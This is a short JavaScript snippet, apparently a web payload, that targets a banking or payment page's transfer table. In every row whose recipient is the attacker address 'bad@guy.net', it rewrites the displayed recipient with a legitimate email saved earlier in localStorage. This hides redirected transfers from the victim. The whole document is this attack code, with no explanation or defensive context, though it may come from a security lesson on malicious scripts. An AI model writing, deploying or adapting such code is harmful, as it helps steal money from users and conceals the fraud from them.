BAD_GUY_EMAIL = 'bad@guy.net';

[...document.querySelectorAll('body > main > table > tbody > tr')].forEach(node => {
	const transferId = node.querySelector('td:nth-child(1)').textContent;
	const receiverNode = node.querySelector('td:nth-child(4)');
	if (receiverNode.textContent === BAD_GUY_EMAIL) {
		receiverNode.textContent = window.localStorage.getItem(transferId) || window.localStorage.getItem('last_email');
	}
	return node;
});